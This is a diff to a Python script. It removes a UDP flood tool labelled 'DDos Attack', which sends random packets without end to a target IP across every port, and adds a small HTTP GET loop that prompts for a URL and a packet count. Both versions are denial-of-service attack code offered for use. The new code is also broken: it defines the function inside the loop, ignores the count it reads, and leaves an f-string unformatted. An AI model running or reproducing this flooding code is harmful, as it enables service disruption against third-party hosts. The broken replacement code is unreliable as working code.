@@ -1,46 +1,16 @@
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+import requests
+global x 
+x = input("Enter your url => ")
+y = int(input("Enter your number of packet => "))
+for i in range(10):
+    def send_request(url):
+        try:
+            response = requests.get(url)
+            # You can handle the response here, such as checking the status code or content
+            print("Request sent successfully!")
+        except requests.exceptions.RequestException as e:
+            print("An error occurred: {str(e)}")
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print ("Author   : RatDenial")
-ip = input("IP Target : ")
-port = input("Port       : ")
-
-os.system("clear")
-os.system("figlet Attack Starting")
-print ("[                    ] 0% ")
-time.sleep(5)
-print ("[=====               ] 25%")
-time.sleep(5)
-print ("[==========          ] 50%")
-time.sleep(5)
-print ("[===============     ] 75%")
-time.sleep(5)
-print ("[====================] 100%")
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
-     if port == 65534:
-       port = 1
+    # Example usage
+    url_to_request = x
+    send_request(url_to_request)
